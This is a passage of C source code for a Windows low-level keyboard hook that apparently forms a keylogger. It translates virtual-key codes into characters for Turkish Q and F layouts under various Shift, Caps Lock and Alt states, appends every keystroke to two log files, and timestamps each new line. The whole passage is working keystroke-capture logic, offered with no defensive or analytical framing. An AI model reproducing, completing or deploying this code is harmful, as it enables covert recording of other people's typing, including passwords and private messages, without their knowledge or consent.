                    fputs(";", pTQLogFile);
                    fputs(";", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("_", pTQLogFile);
                    fputs("_", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(":", pTQLogFile);
                    fputs(":", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("Ö", pTQLogFile);
                    fputs("Ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("é", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("Ð", pTQLogFile);
                    fputs("Ý", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("Ç", pTQLogFile);
                    fputs("Ö", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("Ü", pTQLogFile);
                    fputs("Ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("Ý", pTQLogFile);
                    fputs("Þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("?", pTQLogFile); /* Only TRQ. */
                    //fputs("?", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs(">", pTQLogFile);
                    fputs(">", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
            else /* KEYDOWN (NO CAPS LOCK - NO SHIFT) */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("0", pTQLogFile);
                    fputs("0", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs("1", pTQLogFile);
                    fputs("1", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("2", pTQLogFile);
                    fputs("2", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("3", pTQLogFile);
                    fputs("3", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("4", pTQLogFile);
                    fputs("4", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("5", pTQLogFile);
                    fputs("5", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("6", pTQLogFile);
                    fputs("6", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("7", pTQLogFile);
                    fputs("7", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("8", pTQLogFile);
                    fputs("8", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs("9", pTQLogFile);
                    fputs("9", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("a", pTQLogFile);
                    fputs("a", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("b", pTQLogFile);
                    fputs("b", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("c", pTQLogFile);
                    fputs("c", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("d", pTQLogFile);
                    fputs("d", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("e", pTQLogFile);
                    fputs("e", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("f", pTQLogFile);
                    fputs("f", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("g", pTQLogFile);
                    fputs("g", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("h", pTQLogFile);
                    fputs("h", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("ý", pTQLogFile);
                    fputs("ý", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("j", pTQLogFile);
                    fputs("j", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("k", pTQLogFile);
                    fputs("k", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("l", pTQLogFile);
                    fputs("l", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("m", pTQLogFile);
                    fputs("m", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("n", pTQLogFile);
                    fputs("n", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("o", pTQLogFile);
                    fputs("o", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("p", pTQLogFile);
                    fputs("p", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("q", pTQLogFile);
                    fputs("q", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("r", pTQLogFile);
                    fputs("r", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("s", pTQLogFile);
                    fputs("s", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("t", pTQLogFile);
                    fputs("t", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("u", pTQLogFile);
                    fputs("u", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("v", pTQLogFile);
                    fputs("v", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("w", pTQLogFile);
                    fputs("w", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("x", pTQLogFile);
                    fputs("x", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("y", pTQLogFile);
                    fputs("y", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("z", pTQLogFile);
                    fputs("z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("þ", pTQLogFile);
                    fputs("ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("/", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs(",", pTQLogFile);
                    fputs(",", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(".", pTQLogFile);
                    fputs(".", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("ö", pTQLogFile);
                    fputs("ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("\"", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("ð", pTQLogFile);
                    fputs("i", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("ç", pTQLogFile);
                    fputs("ö", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("ü", pTQLogFile);
                    fputs("ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("i", pTQLogFile);
                    fputs("þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("*", pTQLogFile); /* Only TRQ. */
                    //fputs("*", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs("<", pTQLogFile);
                    fputs("<", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
        }
        switch(vkCode) /* KEYDOWN OTHERS */
        {
            //case VK_SPACE:
            //    fputs(" ", pTQLogFile);
            //    fputs(" ", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
        case 0x2E:
            fputs("[Delete/.]", pTQLogFile);
            fputs("[Delete/.]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
            //case VK_BACK:
            //    fputs("[Backspace]", pTQLogFile);
            //    fputs("[Backspace]", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
            //case VK_RETURN:
            //    fputs("[Enter]\n", pTQLogFile);
            //    fputs("[Enter]\n", pTFLogFile);
            //    fnAllFileStreamsCloser();
            //    fnNewLineTimerPrinter(); break;
        case VK_LCONTROL:
            fputs("[Left Ctrl]", pTQLogFile);
            fputs("[Left Ctrl]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_RCONTROL:
            fputs("[Right Ctrl]", pTQLogFile);
            fputs("[Right Ctrl]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_PAUSE:
            fputs("[Pause/Break]", pTQLogFile);
            fputs("[Pause/Break]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
            //case VK_TAB:
            //    fputs("[Tab]", pTQLogFile);
            //    fputs("[Tab]", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
        case 0x25:
            fputs("[Left Arrow]", pTQLogFile);
            fputs("[Left Arrow]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case 0x26:
            fputs("[Up Arrow]", pTQLogFile);
            fputs("[Up Arrow]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case 0x27:
            fputs("[Right Arrow]", pTQLogFile);
            fputs("[Right Arrow]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case 0x28:
            fputs("[Down Arrow]", pTQLogFile);
            fputs("[Down Arrow]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
            //case VK_ESCAPE:
            //    fputs("[Esc]", pTQLogFile);
            //    fputs("[Esc]", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
            //case VK_CAPITAL:
            //    fputs("[Caps Lock]", pTQLogFile);
            //    fputs("[Caps Lock]", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
            //case VK_RSHIFT:
            //    fputs("[Right Shift]", pTQLogFile);
            //    fputs("[Right Shift]", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
            //case VK_LSHIFT:
            //    fputs("[Left Shift]", pTQLogFile);
            //    fputs("[Left Shift]", pTFLogFile);
            //    fnAllFileStreamsCloser(); break;
        case VK_LMENU:
            fputs("[Left Alt]", pTQLogFile);
            fputs("[Left Alt]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_RMENU:
            fputs("[Right Alt]", pTQLogFile);
            fputs("[Right Alt]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_LWIN:
            fputs("[Left Win]", pTQLogFile);
            fputs("[Left Win]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_RWIN:
            fputs("[Right Win]", pTQLogFile);
            fputs("[Right Win]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_INSERT:
            fputs("[Insert]", pTQLogFile);
            fputs("[Insert]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_SCROLL:
            fputs("[Scroll Lock]", pTQLogFile);
            fputs("[Scroll Lock]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMLOCK:
            fputs("[Num Lock]", pTQLogFile);
            fputs("[Num Lock]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_HOME:
            fputs("[Home]", pTQLogFile);
            fputs("[Home]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_END:
            fputs("[End]", pTQLogFile);
            fputs("[End]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_PRIOR:
            fputs("[Page Up]", pTQLogFile);
            fputs("[Page Up]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NEXT:
            fputs("[Page Down]", pTQLogFile);
            fputs("[Page Down]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_SNAPSHOT:
            fputs("[Print Screen]", pTQLogFile);
            fputs("[Print Screen]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F1:
            fputs("[F1]", pTQLogFile);
            fputs("[F1]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F2:
            fputs("[F2]", pTQLogFile);
            fputs("[F2]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F3:
            fputs("[F3]", pTQLogFile);
            fputs("[F3]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F4:
            fputs("[F4]", pTQLogFile);
            fputs("[F4]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F5:
            fputs("[F5]", pTQLogFile);
            fputs("[F5]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F6:
            fputs("[F6]", pTQLogFile);
            fputs("[F6]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F7:
            fputs("[F7]", pTQLogFile);
            fputs("[F7]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F8:
            fputs("[F8]", pTQLogFile);
            fputs("[F8]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F9:
            fputs("[F9]", pTQLogFile);
            fputs("[F9]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F10:
            fputs("[F10]", pTQLogFile);
            fputs("[F10]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F11:
            fputs("[F11]", pTQLogFile);
            fputs("[F11]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F12:
            fputs("[F12]", pTQLogFile);
            fputs("[F12]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F13:
            fputs("[F13]", pTQLogFile);
            fputs("[F13]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F14:
            fputs("[F14]", pTQLogFile);
            fputs("[F14]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F15:
            fputs("[F15]", pTQLogFile);
            fputs("[F15]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F16:
            fputs("[F16]", pTQLogFile);
            fputs("[F16]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F17:
            fputs("[F17]", pTQLogFile);
            fputs("[F17]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F18:
            fputs("[F18]", pTQLogFile);
            fputs("[F18]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F19:
            fputs("[F19]", pTQLogFile);
            fputs("[F19]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F20:
            fputs("[F20]", pTQLogFile);
            fputs("[F20]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F21:
            fputs("[F21]", pTQLogFile);
            fputs("[F21]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F22:
            fputs("[F22]", pTQLogFile);
            fputs("[F22]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F23:
            fputs("[F23]", pTQLogFile);
            fputs("[F23]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_F24:
            fputs("[F24]", pTQLogFile);
            fputs("[F24]", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD0:
            fputs("0", pTQLogFile);
            fputs("0", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD1:
            fputs("1", pTQLogFile);
            fputs("1", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD2:
            fputs("2", pTQLogFile);
            fputs("2", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD3:
            fputs("3", pTQLogFile);
            fputs("3", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD4:
            fputs("4", pTQLogFile);
            fputs("4", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD5:
            fputs("5", pTQLogFile);
            fputs("5", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD6:
            fputs("6", pTQLogFile);
            fputs("6", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD7:
            fputs("7", pTQLogFile);
            fputs("7", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD8:
            fputs("8", pTQLogFile);
            fputs("8", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        case VK_NUMPAD9:
            fputs("9", pTQLogFile);
            fputs("9", pTFLogFile);
            fnAllFileStreamsCloser(); break;
        }
    }
    fnAllFileStreamsCloser(); break;
    case WM_SYSKEYDOWN: /* ALT KEY DOWN */
    {
        DWORD vkCode = pKeyboard->vkCode;
        if(fnIsCapslock()) /* ALT + CAPS LOCK */
        {
            if((GetAsyncKeyState(VK_RSHIFT) ||
                GetAsyncKeyState(VK_LSHIFT))) /* ALT + CAPS LOCK + SHIFT */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("=", pTQLogFile);
                    fputs("=", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs("!", pTQLogFile);
                    fputs("¡", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("'", pTQLogFile);
                    fputs("\"", pTFLogFile);  /* Escape Seq. \" */
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("^", pTQLogFile);
                    fputs("³", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("+", pTQLogFile);
                    fputs("¤", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("%", pTQLogFile);
                    fputs("%", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("&", pTQLogFile);
                    fputs("&", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("/", pTQLogFile);
                    fputs("'", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("(", pTQLogFile);
                    fputs("(", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs(")", pTQLogFile);
                    fputs(")", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("æ", pTQLogFile);
                    fputs("ª", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("b", pTQLogFile);
                    fputs("b", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("c", pTQLogFile);
                    fputs("c", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("d", pTQLogFile);
                    fputs("d", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("e", pTQLogFile);
                    fputs("e", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("f", pTQLogFile);
                    fputs("f", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("g", pTQLogFile);
                    fputs("g", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("h", pTQLogFile);
                    fputs("ø", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("i", pTQLogFile);
                    fputs("®", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("j", pTQLogFile);
                    fputs("<", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("k", pTQLogFile);
                    fputs("k", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("l", pTQLogFile);
                    fputs("l", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("m", pTQLogFile);
                    fputs("m", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("n", pTQLogFile);
                    fputs("n", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("o", pTQLogFile);
                    fputs("o", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("p", pTQLogFile);
                    fputs("p", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("q", pTQLogFile);
                    fputs("q", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("r", pTQLogFile);
                    fputs("r", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("s", pTQLogFile);
                    fputs("º", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("t", pTQLogFile);
                    fputs("t", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("u", pTQLogFile);
                    fputs("æ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("v", pTQLogFile);
                    fputs("©", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("w", pTQLogFile);
                    fputs("w", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("x", pTQLogFile);
                    fputs("x", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("y", pTQLogFile);
                    fputs("y", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("z", pTQLogFile);
                    fputs("z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("þ", pTQLogFile);
                    fputs("ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("¿", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs(";", pTQLogFile);
                    fputs(";", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("_", pTQLogFile);
                    fputs("_", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(":", pTQLogFile);
                    fputs(":", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("ö", pTQLogFile);
                    fputs("ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("é", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("ð", pTQLogFile);
                    fputs("i", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("ç", pTQLogFile);
                    fputs("ö", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("ü", pTQLogFile);
                    fputs("ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("i", pTQLogFile);
                    fputs("þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("?", pTQLogFile); /* Only TRQ. */
                    //fputs("?", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs(">", pTQLogFile);
                    fputs(">", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
            else /* ALT + CAPS LOCK (NO SHIFT) */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("}", pTQLogFile);
                    fputs("}", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs(">", pTQLogFile);
                    fputs("¹", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("£", pTQLogFile);
                    fputs("²", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
